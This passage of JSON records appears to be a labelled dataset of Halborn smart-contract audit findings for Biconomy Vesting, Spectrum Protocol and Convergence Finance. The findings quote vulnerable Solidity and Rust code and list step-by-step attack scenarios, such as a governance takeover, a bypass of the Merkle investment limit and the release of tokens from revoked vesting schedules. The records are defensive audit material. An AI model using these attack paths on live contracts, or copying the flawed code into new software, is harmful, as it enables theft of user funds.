control to revoke method. Listing 20: BicoVestingFlat.sol (Lines 1291) 1290 function revoke ( address beneficiary ) external onlyAdmin { 1291 require ( claims [ beneficiary ] != false , \" Already invalidated . \" ); claims [ beneficiary ]. isActive = false ; emit Revoked ( beneficiary ); 1292 1293 1294 } Remediation Plan: SOLVED: The Biconomy Team solved this issue by adding additional require check to the contract code. Commit ID: f1ad27ca200d00adb1568b9d6a16bc10dda555e3 31 ", "labels": ["Halborn", "Biconomy_Vesting", "Severity: Low"]}, {"title": "USE OF BLOCK.TIMESTAMP", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Vesting_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "During a manual review, the use of block.timestamp has identified. The contract developers should be aware that this does not mean current time. Miners can influence the value of block.timestamp to perform Maximal Extractable Value (MEV) attacks. The use of block.timestamp creates a risk that miners could perform time manipulation to influence price oracles. Miners can modify the timestamp by up to 900 seconds. It is also known that these block.timestamp values only used on events. However, if a malicious miner exploits any vulnerability on the contract, this miner can confuse incident response teams by manipulating these events. Code Location: Listing 1241,1242,1245,1247,1252,1253,1263,1264) 21: BicoVestingFlat.sol (Lines { public view returns ( uint256 ) 1234 function claimableAmount ( address beneficiary ) 1235 1236 1237 1238 1239 1240 1241 1242 1243 1244 1245 block . timestamp < _claim . startTime && block . timestamp < _claim . unlockTime Claim memory _claim = claims [ beneficiary ]; if ( ) return 0; if ( _claim . amountClaimed == _claim . vestAmount ) return 0; uint256 currentTimestamp = block . timestamp > _claim . 1246 1247 1248 1249 1250 1251 endTime ? _claim . endTime : block . timestamp ; uint256 claimPercent ; uint256 claimAmount ; uint256 unclaimedAmount ; if ( 32 1252 1253 1254 1255 1256 1257 1258 1259 1260 1261 1262 1263 1264 1265 1266 1267 1268 1269 1270 1271 1272 1273 1274 1275 1276 _claim . unlockTime <= block . timestamp && _claim . startTime <= block . timestamp ) { claimPercent = currentTimestamp . sub ( _claim . startTime ). mul (1 e18 ). div ( _claim . endTime . sub ( _claim . startTime ) ); claimAmount = _claim . vestAmount . mul ( claimPercent ). div (1 e18 ). add ( _claim . unlockAmount ); unclaimedAmount = claimAmount . sub ( _claim . amountClaimed ); } else if ( _claim . unlockTime > block . timestamp && _claim . startTime <= block . timestamp ) { claimPercent = currentTimestamp . sub ( _claim . startTime ). mul (1 e18 ). div ( _claim . endTime . sub ( _claim . startTime ) ); claimAmount = _claim . vestAmount . mul ( claimPercent ). div (1 e18 ); unclaimedAmount = claimAmount . sub ( _claim . amountClaimed ); } else { claimAmount = _claim . unlockAmount ; unclaimedAmount = claimAmount . sub ( _claim . amountClaimed ); } return unclaimedAmount ; } Risk Level: Likelihood - 2 Impact - 2 33 Recommendations: Use block.number instead of block.timestamp or now to reduce the risk of Maximal Extractable Value (MEV) attacks. Check if the timescale of the project occurs across years, days, and months rather than seconds. References: Block Values as a Proxy for Time Remediation Plan: ACKNOWLEDGED: The Biconomy Team acknowledged this issue. 34 3.10 (HAL-10) IGNORED RETURN VALUES - INFORMATIONAL ", "labels": ["Halborn", "Biconomy_Vesting", "Severity: Informational"]}, {"title": "PRIVILEGED ADDRESSES CAN BE TRANSFERRED WITHOUT CONFIRMATION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Spectrum_Protocol_CosmWasm_Smart_Contract_Security_Audit_Halborn_Report_v1_1.pdf", "body": "An incorrect use of the update_config function in contracts can set owner to an invalid address and inadvertently lose control of the contracts, which cannot be undone in any way. Currently, the owner of the contracts can change owner address using the aforementioned function in a single transaction and without confirmation from the new address. The affected smart contracts are the following:  spectrum_anchor_farm  spectrum_gov  spectrum_mirror_farm  spectrum_platform  spectrum_pylon_farm  spectrum_spec_farm  spectrum_wallet Code Location: Listing 1: contracts/spectrum_anchor_farm/src/contract.rs 170 171 172 if let Some ( owner ) = owner { config . owner = deps . api . canonical_address (& owner ) ?; } Listing 2: contracts/spectrum_gov/src/contract.rs 199 200 201 if let Some ( owner ) = owner { config . owner = deps . api . canonical_address (& owner ) ?; } 15 Listing 3: contracts/spectrum_mirror_farm/src/contract.rs 174 175 176 if let Some ( owner ) = owner { config . owner = deps . api . canonical_address (& owner ) ?; } Listing 4: contracts/spectrum_platform/src/contract.rs 119 120 121 if let Some ( owner ) = owner { config . owner = deps . api . canonical_address (& owner ) ?; } Listing 5: contracts/spectrum_pylon_farm/src/contract.rs 170 171 172 if let Some ( owner ) = owner { config . owner = deps . api . canonical_address (& owner ) ?; } Listing 6: contracts/spectrum_spec_farm/src/contract.rs 144 145 146 if let Some ( owner ) = owner { config . owner = deps . api . canonical_address (& owner ) ?; } Listing 7: contracts/spectrum_wallet/src/contract.rs 369 370 371 if let Some ( owner ) = owner { config . owner = deps . api . canonical_address (& owner ) ?; } Risk Level: Likelihood - 3 Impact - 3 16 Recommendation: It is recommended to split ownership transfer functionality into set_owner and accept_ownership functions. The latter function allows the transfer to be completed by recipient. Remediation plan: SOLVED: Issue fixed in commit 6010909e58197a23c4e194e296250b569e9f0564. Contracts owner cannot be updated once Gov contract is set as owner. 17 ", "labels": ["Halborn", "Spectrum_Protocol_CosmWasm", "Severity: Medium"]}, {"title": "NOT ENFORCING SLIPPAGE TOLERANCE COULD LEAD TOKENS LOSS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Spectrum_Protocol_CosmWasm_Smart_Contract_Security_Audit_Halborn_Report_v1_1.pdf", "body": "The bond function from contracts/spectrum_staker/src/contract.rs does not enforce slippage_tolerance parameter when users provide liquidity to spectrum_staker contract. As a consequence, if a user mistakenly (or fooled by an attacker) provides liquidity with an imbalanced asset pair, he could lose all his excedent tokens. Example: A user provides liquidity of 0.999258 UST and 0.006815 mAAPL for spectrum_staker contract, he receives 0.079814 mAAPL-UST LP. 18 On the other hand, if the user provides liquidity of 0.999258 UST and 0.681536 mAAPL for spectrum_staker contract, he also receives 0.079814 mAAPL-UST LP, the same amount of LP tokens than previous transaction, but spending 100 times more mAAPL tokens. Code Location: Listing 8: contracts/spectrum_staker/src/contract.rs (Lines 69) 64 65 66 67 68 69 70 71 fn bond < S: Storage , A : Api , Q: Querier >( deps : & mut Extern <S , A , Q >, env : Env , contract : HumanAddr , assets : [ Asset ; 2] , slippage_tolerance : Option < Decimal >, compound_rate : Option < Decimal >, ) -> StdResult < HandleResponse > { 19 Listing 9: contracts/spectrum_staker/src/contract.rs (Lines 149) 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 CosmosMsg :: Wasm ( WasmMsg :: Execute { contract_addr : terraswap_pair . contract_addr , msg : to_binary (& PairHandleMsg :: ProvideLiquidity { assets : if let AssetInfo :: NativeToken { .. } = assets [0]. info . clone () { [ native_asset . clone () , assets [1]. clone () ] } else { [ assets [0]. clone () , native_asset . clone () ] }, slippage_tolerance , }) ?, send : vec! [ Coin { denom : native_asset . info . to_string () , amount : native_asset . amount , }] , }) , Risk Level: Likelihood - 1 Impact - 4 Recommendation: Enforce slippage_tolerance parameter in bond function and add a validation routine to ensure that this value is lesser or equal than a predefined max value. As a reference, max slippage tolerance for Uniswap liquidity pools is 50%. Remediation plan: SOLVED: Issue fixed in commit f298e93f5d0a018a03302f9a317f650d061b5020. 20 ", "labels": ["Halborn", "Spectrum_Protocol_CosmWasm", "Severity: Low"]}, {"title": "NO MINIMUM THRESHOLD FOR EFFECTIVE DELAY", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Spectrum_Protocol_CosmWasm_Smart_Contract_Security_Audit_Halborn_Report_v1_1.pdf", "body": "Timelocks are defined in Governance contracts to allow protocol users to react timely if a change made is bad faith or is not in the best interest of protocol and its users. The init and update_config functions from contracts/spectrum_gov/src/- contract.rs do not restrict that timelock (effective_delay) is greater or equal than a minimum threshold. So, malicious changes proposed through voting could even be executed immediately if effective_delay is not set appropriately. Code Location: Listing 10: contracts/spectrum_gov/src/contract.rs (Lines 39) 29 30 31 32 33 34 35 36 37 38 39 40 let config = Config { owner : deps . api . canonical_address (& msg . owner )? , spec_token : if let Some ( spec_token ) = msg . spec_token { deps . api . canonical_address (& spec_token )? } else { CanonicalAddr :: default () }, quorum : msg . quorum , threshold : msg . threshold , voting_period : msg . voting_period , effective_delay : msg . effective_delay , expiration_period : msg . expiration_period , Listing 11: contracts/spectrum_gov/src/contract.rs (Lines 225) 224 225 226 if let Some ( effective_delay ) = effective_delay { config . effective_delay = effective_delay ; } 21 Risk Level: Likelihood - 1 Impact - 4 Recommendation: Add a validation routine inside init and update_config functions to ensure that timelock (effective_delay) is greater or equal than a minimum threshold that allows Spectrum users to act timely against any issue that protocol could have when changes are made. The following are some examples of timelocks used on other protocols:  Uniswap: 48-hours timelock  Compound: 48-hours timelock  Aave: 24-hours timelock (Short time lock) Remediation plan: SOLVED: Issue fixed in commit 224e758890d84ad4fbe15c554a587e164e5f92c6. 22 ", "labels": ["Halborn", "Spectrum_Protocol_CosmWasm", "Severity: Low"]}, {"title": "SPECTRUM PLATFORM COULD BE INITIALIZED WITH INSECURE QUORUM AND THRESHOLD", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Spectrum_Protocol_CosmWasm_Smart_Contract_Security_Audit_Halborn_Report_v1_1.pdf", "body": "The init function from contracts/spectrum_platform/src/contract.rs only restrict that quorum and threshold parameters are not greater than one; however, when spectrum_platform is initialized, there will exist few boards, i.e.: who are able to vote, which allows that a malicious board can takeover spectrum_platform contract if the aforementioned parameters are not set appropriately. Attack scenario: 1. The spectrum_platform is initialized with the following parameters: quorum = 10% and threshold = 50%. 2. There are 3 boards, each one has a weight = 1. 3. Board 1 creates a new poll with a execution message that changes its own weight to 100. 4. Board 1 votes for VoteOption::yes. 5. Board 2 votes for VoteOption::no and Board 3 does not vote. 6. Voting phase ends and Board 1 will be able to change its own weight to 100. So, now he totally controls spectrum_platform for future voting, despite of vote results from other boards. Code Location: Listing 12: contracts/spectrum_platform/src/contract.rs (Lines 28,29) deps : & mut Extern <S , A , Q >, env : Env , msg : ConfigInfo , 18 pub fn init < S: Storage , A : Api , Q: Querier >( 19 20 21 22 ) -> StdResult < InitResponse > { 23 validate_quorum ( msg . quorum ) ?; 23 24 25 26 27 28 29 30 31 32 33 validate_threshold ( msg . threshold ) ?; let config = Config { owner : deps . api . canonical_address (& msg . owner )? , quorum : msg . quorum , threshold : msg . threshold , voting_period : msg . voting_period , effective_delay : msg . effective_delay , expiration_period : msg . expiration_period , }; Risk Level: Likelihood - 1 Impact - 4 Recommendation: Add a validation routine inside init function to ensure that quorum and threshold are greater or equal than 50%. Remediation plan: SOLVED: Issue fixed in commit 92d1cd57b8f78b4d562644ae1d8c64cd2e3d12ed. 24 ", "labels": ["Halborn", "Spectrum_Protocol_CosmWasm", "Severity: Low"]}, {"title": "NO VERIFICATION THAT LOCK END MUST BE GREATER OR EQUAL THAN LOCK START", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Spectrum_Protocol_CosmWasm_Smart_Contract_Security_Audit_Halborn_Report_v1_1.pdf", "body": "The init and update_config functions do not restrict that lock_end is These values are used to calculate greater or equal than lock_start. locked rewards when a user withdraws rewards from farms. If they are not correctly set, locked rewards could be miscalculated, so rewards distributed would be unfair. The affected smart contracts are the following:  spectrum_anchor_farm  spectrum_mirror_farm  spectrum_pylon_farm  spectrum_spec_farm Code Location: Listing 13: contracts/spectrum_anchor_farm/src/contract.rs 63 64 lock_start : msg . lock_start , lock_end : msg . lock_end , Listing 14: contracts/spectrum_anchor_farm/src/contract.rs 202 203 204 205 206 207 208 if let Some ( lock_start ) = lock_start { config . lock_start = lock_start ; } if let Some ( lock_end ) = lock_end { config . lock_end = lock_end ; } 25 Listing 15: contracts/spectrum_mirror_farm/src/contract.rs 66 67 lock_start : msg . lock_start , lock_end : msg . lock_end , Listing 16: contracts/spectrum_mirror_farm/src/contract.rs 206 207 208 209 210 211 212 if let Some ( lock_start ) = lock_start { config . lock_start = lock_start ; } if let Some ( lock_end ) = lock_end { config . lock_end = lock_end ; } Listing 17: contracts/spectrum_pylon_farm/src/contract.rs 63 64 lock_start : msg . lock_start , lock_end : msg . lock_end , Listing 18: contracts/spectrum_pylon_farm/src/contract.rs 202 203 204 205 206 207 208 if let Some ( lock_start ) = lock_start { config . lock_start = lock_start ; } if let Some ( lock_end ) = lock_end { config . lock_end = lock_end ; } Listing 19: contracts/spectrum_spec_farm/src/contract.rs 27 28 lock_start : msg . lock_start , lock_end : msg . lock_end , Listing 20: contracts/spectrum_spec_farm/src/contract.rs 148 149 150 if let Some ( lock_start ) = lock_start { config . lock_start = lock_start ; } 26 151 152 153 154 if let Some ( lock_end ) = lock_end { config . lock_end = lock_end ; } Risk Level: Likelihood - 2 Impact - 3 Recommendation: Add a validation routine inside init and update_config functions to ensure that lock_end is greater or equal than lock_start. Remediation plan: SOLVED: Issue fixed in commit 6010909e58197a23c4e194e296250b569e9f0564. Validation routine has been applied in init functions and changes for lock_start / lock_end have been disabled in update_config functions. 27 ", "labels": ["Halborn", "Spectrum_Protocol_CosmWasm", "Severity: Low"]}, {"title": "DEPOSIT FEE RATE COULD BE SET TO A VALUE GREATER THAN 1", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Spectrum_Protocol_CosmWasm_Smart_Contract_Security_Audit_Halborn_Report_v1_1.pdf", "body": "The init function does not restrict that value of deposit_fee rate is greater than 1. This value is used to calculate deposit fee (and its splits) when a user provides liquidity to farm contracts. If it is not correctly set, the operation will always panic and wont allow legitimate users to provide liquidity, thus generating a denial of service (DoS) in Spectrum protocol. The affected smart contracts are the following:  spectrum_anchor_farm  spectrum_mirror_farm  spectrum_pylon_farm Code Location: Listing 21: contracts/spectrum_anchor_farm/src/contract.rs deps : & mut Extern <S , A , Q >, env : Env , msg : ConfigInfo , 28 pub fn init < S: Storage , A : Api , Q: Querier >( 29 30 31 32 ) -> StdResult < InitResponse > { 33 34 35 36 37 let api = deps . api ; validate_percentage ( msg . community_fee , \" community_fee \") ?; validate_percentage ( msg . platform_fee , \" platform_fee \" ) ?; validate_percentage ( msg . controller_fee , \" controller_fee \" ) ?; 28 Listing 22: contracts/spectrum_mirror_farm/src/contract.rs deps : & mut Extern <S , A , Q >, env : Env , msg : ConfigInfo , 31 pub fn init < S: Storage , A : Api , Q: Querier >( 32 33 34 35 ) -> StdResult < InitResponse > { 36 37 38 39 40 let api = deps . api ; validate_percentage ( msg . community_fee , \" community_fee \") ?; validate_percentage ( msg . platform_fee , \" platform_fee \" ) ?; validate_percentage ( msg . controller_fee , \" controller_fee \" ) ?; Listing 23: contracts/spectrum_pylon_farm/src/contract.rs deps : & mut Extern <S , A , Q >, env : Env , msg : ConfigInfo , 28 pub fn init < S: Storage , A : Api , Q: Querier >( 29 30 31 32 ) -> StdResult < InitResponse > { 33 34 35 36 37 let api = deps . api ; validate_percentage ( msg . community_fee , \" community_fee \") ?; validate_percentage ( msg . platform_fee , \" platform_fee \" ) ?; validate_percentage ( msg . controller_fee , \" controller_fee \" ) ?; Risk Level: Likelihood - 2 Impact - 3 Recommendation: Apply validate_percentage function inside init to ensure deposit_fee rate is lesser or equal than 1. Remediation plan: SOLVED: Issue fixed in commit 3d6bf3908ae1f0eb05aedc8a585015fbcc223120. 29 ", "labels": ["Halborn", "Spectrum_Protocol_CosmWasm", "Severity: Low"]}, {"title": "SPEC TOKENS MINTING START COULD BE GREATER THAN MINTING END", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Spectrum_Protocol_CosmWasm_Smart_Contract_Security_Audit_Halborn_Report_v1_1.pdf", "body": "The init and update_config functions from spectrum_gov contract do not restrict that mint_end is greater or equal than mint_start. These values are used to calculate how much SPEC tokens can be minted as reward to warchest and vaults. If they are not correctly set, amount of SPEC tokens to mint could be miscalculated, so reward distributed would be unfair. Code Location: Listing 24: contracts/spectrum_gov/src/contract.rs (Lines 43,44) validate_percentage ( msg . quorum , \" quorum \") ?; validate_percentage ( msg . threshold , \" threshold \") ?; validate_percentage ( msg . warchest_ratio , \" warchest_ratio \" ) ?; let config = Config { deps : & mut Extern <S , A , Q >, env : Env , msg : ConfigInfo , 20 pub fn init < S: Storage , A : Api , Q: Querier >( 21 22 23 24 ) -> StdResult < InitResponse > { 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 }, quorum : msg . quorum , threshold : msg . threshold , voting_period : msg . voting_period , effective_delay : msg . effective_delay , expiration_period : msg . expiration_period , CanonicalAddr :: default () } else { owner : deps . api . canonical_address (& msg . owner )? , spec_token : if let Some ( spec_token ) = msg . spec_token { deps . api . canonical_address (& spec_token )? 30 41 42 43 44 proposal_deposit : msg . proposal_deposit , mint_per_block : msg . mint_per_block , mint_start : msg . mint_start , mint_end : msg . mint_end , Listing 25: contracts/spectrum_gov/src/contract.rs (Lines 251,255) 250 251 252 253 254 255 256 257 258 259 260 261 262 if let Some ( mint_start ) = mint_start { config . mint_start = mint_start ; } if let Some ( mint_end ) = mint_end { config . mint_end = mint_end ; let mut state = state_store (& mut deps . storage ). load () ?; if validate_minted (& state , & config , env . block . height ). is_err () { state . last_mint = env . block . height ; state_store (& mut deps . storage ). save (& state ) ?; } } Risk Level: Likelihood - 2 Impact - 3 Recommendation: Add a validation routine inside init and update_config functions to ensure that mint_end is greater or equal than mint_start. Remediation plan: SOLVED: Issue fixed in commit 6010909e58197a23c4e194e296250b569e9f0564. Validation routine has been applied in init function and changes for mint_start / mint_end have been disabled in update_config function. 31 ", "labels": ["Halborn", "Spectrum_Protocol_CosmWasm", "Severity: Low"]}, {"title": "NO MECHANISM TO UPDATE ASSETS IF ARE INCORRECTLY REGISTERED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Spectrum_Protocol_CosmWasm_Smart_Contract_Security_Audit_Halborn_Report_v1_1.pdf", "body": "The register_asset function from contracts/spectrum_mirror_farm/src/con- tract.rs does not allow updating staking_token parameter if asset is incorrectly registered. Due to the fact the spectrum_mirror_farm handles many assets, if there is any issue with the register of one of them, the contract will never be able to use this asset because it cannot be updated, nor registered again. Code Location: Listing 26: contracts/spectrum_mirror_farm/src/contract.rs (Lines 243) 240 241 242 243 244 245 246 247 248 let mut pool_info = pool_info_read (& deps . storage ) . may_load ( asset_token_raw . as_slice () )? . unwrap_or_else (|| PoolInfo { staking_token : deps . api . canonical_address (& staking_token ). unwrap () , total_auto_bond_share : Uint128 :: zero () , total_stake_bond_share : Uint128 :: zero () , total_stake_bond_amount : Uint128 :: zero () , weight : 0 u32 , auto_compound : false , Risk Level: Likelihood - 2 Impact - 3 32 Recommendation: is recommended It updating register_asset staking_token parameter only if assets pool is empty, i.e.: bond amount and bond share are zero. function allows that Remediation plan: SOLVED: Issue fixed in commit 25c7941918e30a8c8f01b3c79c83c78483578803. 33 ", "labels": ["Halborn", "Spectrum_Protocol_CosmWasm", "Severity: Low"]}, {"title": "BOND FUNCTION COULD SEND LP TOKENS TO INVALID FARM CONTRACTS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Spectrum_Protocol_CosmWasm_Smart_Contract_Security_Audit_Halborn_Report_v1_1.pdf", "body": "The bond function from contracts/spectrum_staker/src/contract.rs does not restrict that the contract parameter sent is an address of an actual farm contract: Anchor, Mirror, Pylon or Spec. As a consequence, if a user mistakenly (or fooled by an attacker) sends an incorrect address in the aforementioned parameter, the tokens deposited in spectrum_staker contract can be totally lost. Code Location: Listing 27: contracts/spectrum_staker/src/contract.rs (Lines 159) 156 CosmosMsg :: Wasm ( WasmMsg :: Execute { 157 158 159 160 161 162 163 164 165 166 167 }) ?, send : vec! [] , }) , contract_addr : env . contract . address , msg : to_binary (& HandleMsg :: bond_hook { contract , asset_token : token_addr . clone () , staking_token : terraswap_pair . liquidity_token , staker_addr : env . message . sender , prev_staking_token_amount , compound_rate , Risk Level: Likelihood - 1 Impact - 3 34 Recommendation: Add a validation routine inside bond function to ensure that contract parameter belongs to a allowlist of actual farm contracts; otherwise, reject the operation. Remediation plan: SOLVED: Issue fixed in commit c785d1929ee09ce348feeac18b52fed51a8a7abb. 35 3.10 (HAL-10) HARVEST AND REINVEST FUNCTIONALITIES ARE NOT RESTRICTED ENOUGH - LOW ", "labels": ["Halborn", "Spectrum_Protocol_CosmWasm", "Severity: Informational"]}, {"title": "MERKLE TREE INVESTMENT LIMIT CAN BE BYPASSED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Convergence_Finance_Convergence_Protocol_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "The WlPresaleCvg contract allows users to buy CVG tokens if they are whitelisted in a Merkle tree. Currently, there are 3 Merkle trees, each one with a different investment limit:  Small with a maximum of 800 * 10e18 CVG tokens.  Medium with a maximum of 4,000 * 10e18 CVG tokens.  Large with a maximum of 8,000 * 10e18 CVG tokens. Users invest by sending the amount to invest, Merkle proof and the type of Merkle tree to the investMint function. This function checks that the amount is below the list type limit and mints a position NFT to the user. Moreover, the refillToken function allows users to refill a position NFT as long as the new total amount does not exceed the Merkle type limit. However, although this function properly increases the cvgRedeemable variable, it does not properly increase the stableInvested amount used to determine whether an investment has exceeded the limit. This allows a malicious user to invest the minimum amount required in order to create a position NFT and later call refillToken multiple times, allowing them to retrieve the whole CVG Tokens, not only bypassing their Merkle tree limits but also leaving other users in the Merkle trees without any tokens. 21 Code Location: Listing 1: contracts/PresaleVesting/WlPresaleCvg.sol 232 function refillToken ( uint256 _tokenId , 233 uint256 _amount , 234 bool _isDai 235 236 ) external { 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 require ( ); \" TOO_MUCH_Q_WL \" require ( ownerOf ( _tokenId ) == msg . sender , \" NOT_OWNED \" ); IERC20 token = _isDai ? Dai : Frax ; uint256 _vestingType = presaleInfos [ _tokenId ]. vestingType ; uint256 cvgAmount = ( _amount * NUMERATOR ) / PRICE_WL ; wlParams [ _vestingType ]. cvgRedeemable += cvgAmount ; _amount + presaleInfos [ _tokenId ]. stableInvested <= wlParams [ _vestingType ]. maxInvest , // / @dev update the presales info for this address , only  change cvgAmount presaleInfos [ _tokenId ]. cvgAmount += cvgAmount ; // / @dev Update available supply supply -= cvgAmount ; // / @dev Transfer token . transferFrom ( msg . sender , address ( this ) , _amount ); 253 254 255 256 257 258 259 260 } BVSS: AO:A/AC:L/AX:L/C:N/I:C/A:C/D:N/Y:C/R:N/S:U (10) 22 Proof of Concept: 1. A malicious user calls investMint() to create a new position. 2. Malicious users call refillToken() multiple times, bypassing the Merkle tree limit and ending with all CVG Token supply. 3. Now, legitimate users can no longer receive their CVG tokens. Recommendation: It is recommended to increase the stableInvested variable in the refillToken function. Remediation Plan: SOLVED: The Convergence Finance team fixed the issue by increasing the stableInvested amount when calling refillToken() in commit 20414f9. 23 ", "labels": ["Halborn", "Convergence_Finance_Convergence_Protocol", "Severity: Critical"]}, {"title": "REVOKED SCHEDULES CAN BE USED TO RELEASE CVG", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Convergence_Finance_Convergence_Protocol_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "In the VestingCvg contract, the revokeVestingSchedule function allows This function reduces the revoking an existing vesting schedule. vestingSchedulesTotalAmount by the amount of CVG pending release. However, when releasing the CVG with any of the available functions (releaseSeed, releaseWl or releaseTeamOrDao) the last vesting sched- ule is retrieved without checking the revoked variable. Even if a new schedule is introduced, if a user calls any of the release functions while the current schedule is revoked, the user can release CVG tokens with the revoked schedule and the released amount is deducted from the vestingSchedulesTotalAmount, causing an underflow for other legitimate user when they are trying to release their tokens. 24 Code Location: Listing 2: contracts/PresaleVesting/VestingCvg.sol 238 function releaseSeed ( uint256 _tokenId ) external onlyOwnerOfSeed (  _tokenId ) { ( 239 240 241 242 243 244 245 uint256 amountToRelease , , , uint256 vestingScheduleId ) = _computeReleaseAmount ( _tokenId , true ); require ( amountToRelease > 0, \" NOT_RELEASABLE \" ); // @audit Not  checking if revoked . 246 247 // update totalReleased & amountReleasedId &  vestingSchedulesTotalAmount 248 vestingSchedules [ vestingScheduleId ]. totalReleased +=  amountToRelease ; amountReleasedIdSeed [ _tokenId ] += amountToRelease ; vestingSchedulesTotalAmount -= amountToRelease ; // transfer Cvg amount to release cvg . transfer ( msg . sender , amountToRelease ); 249 250 251 252 253 254 255 256 } BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:C/R:N/S:U (10) 25 Proof of Concept: 1. An existing vesting schedule is revoked by the administrator. 2. A user with that vesting schedule assigned releases his vested CVG. 3. Vesting schedule gets executed even if it is revoked. 4. When the total released amount approaches the limit, the release functions will underflow for other legitimate users. Recommendation: It is recommended to implement a check to prevent users from releasing CVG if their assigned schedule has been revoked. Remediation Plan: SOLVED: The Convergence Finance team solved this issue by preventing the release functions from being called with a revoked schedule in commit 20414f9. 26 ", "labels": ["Halborn", "Convergence_Finance_Convergence_Protocol", "Severity: Critical"]}, {"title": "ORACLE RESPONSE NOT CHECKED FOR STALE PRICES", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Convergence_Finance_Convergence_Protocol_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "In the CvgOracle contract, the getPriceAggregator function allows the oracle to retrieve the price from a Chainlink aggregator. However, this function is not retrieving the answeredInRound and timestamp parameters to check if the prices are stale. This could lead to the oracle using stale prices in the event that the Chainlink oracle is not being updated. Code Location: Listing 3: contracts/Oracles/CvgOracle.sol 163 function getPriceAggregator ( AggregatorV3Interface aggregator )  public view returns ( uint256 ) { 164  ; 165 (, int256 chainlinkPrice , , , ) = aggregator . latestRoundData () return uint256 ( chainlinkPrice ) * 10 ** (18 - aggregator .  decimals () ); 166 } BVSS: AO:A/AC:L/AX:H/C:N/I:C/A:N/D:C/Y:C/R:N/S:U (5.0) Recommendation: Make sure the prices returned by the Chainlink aggregator are not stale. 27 Listing 4: contracts/Oracles/CvgOracle.sol AggregatorV3Interface aggregator ( uint80 chain , int256 chainlinkPrice , , uint256 updatedAt , uint80 answeredInRound 193 function getPriceAggregator ( 194 195 ) public view returns ( uint256 ) { 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 ); ) = aggregator . latestRoundData () ; require ( answeredInRound >= roundID , \" Stale price \" ); require ( chainlinkPrice > 0, \" Error . NEGATIVE_PRICE \"); require ( block . timestamp <= updatedAt + stalePriceDelay , Error . STALE_PRICE return uint256 ( chainlinkPrice ) * 10 ** (18 - aggregator .  decimals () ); 212 } Remediation Plan: SOLVED: The Convergence Finance team fixed the issue by checking for stale prices in the getAndVerifyPrice() function in commit 20414f9. 28 ", "labels": ["Halborn", "Convergence_Finance_Convergence_Protocol", "Severity: Medium"]}, {"title": "PRICE FEED AGGREGATOR NOT RETURNING ADDITIONAL PARAMETERS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Convergence_Finance_Convergence_Protocol_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "In the CvgV3Aggregator contract, the latestRoundData function returns 0 for the roundId, startedAt, updatedAt, answeredInRound parameters. This does not only disallow to check for stale prices, but it also prevents the aggregator from working with standard contracts that check for stale prices. Code Location: Listing 5: contracts/Oracles/CvgV3Aggregator.sol external view returns ( uint80 roundId , int256 answer , uint256 startedAt , 52 function latestRoundData () 53 54 55  uint256 updatedAt , uint80 answeredInRound ) 56 { 57 58 } return (0 , latestPrice , 0, 0, 0) ; BVSS: AO:A/AC:L/AX:H/C:N/I:C/A:N/D:C/Y:C/R:N/S:U (5.0) Recommendation: Return the proper values for each of the described parameters. 29 Remediation Plan: RISK ACCEPTED: The Convergence Finance team accepted the risk of this issue. 30 ", "labels": ["Halborn", "Convergence_Finance_Convergence_Protocol", "Severity: Medium"]}, {"title": "CENTRALIZATION RISK", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Convergence_Finance_Convergence_Protocol_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "In the current protocol model, the interactions with the aggregated protocol are performed manually through a multi-signature wallet. This means that all the funds received from users using the protocol are transferred to this wallet. This poses a concerning centralization risk as the users funds are sent to a private wallet. Moreover, if the private keys for the multi-signature wallets are ever compromised, all protocol funds could be stolen by a malicious actor. BVSS: AO:S/AC:L/AX:L/C:C/I:C/A:C/D:C/Y:C/R:N/S:C (5.0) Recommendation: Include as many interactions as possible into the smart contracts logic in order to decentralize the protocol. Remediation Plan: RISK ACCEPTED: The Convergence Finance team accepted the risk of this issue. 31 ", "labels": ["Halborn", "Convergence_Finance_Convergence_Protocol", "Severity: Medium"]}, {"title": "NFT TIME LOCKING MECHANISM CAN BE BYPASSED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Convergence_Finance_Convergence_Protocol_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "The CvgERC721TimeLocking contract used to mint position NFTS implements a time-locking mechanism which allows users to lock the NFT, so no rewards can be claimed in order to place it for sale. This prevents a malicious user from front-running a sale transaction and claiming all rewards just before selling it. However, the user can change the lock time frame at any time as long as the new timestamp is greater than the block timestamp. This prevents users from front-running with a new timestamp equal to the block timestamp, which would allow claiming rewards before selling. However, it is possible for a malicious user to determine whether the sell transaction is going to execute in a different block and perform a double front-run, unlocking the NFT in the first block and immediately claiming the rewards in the next one. Code Location: Listing 6: 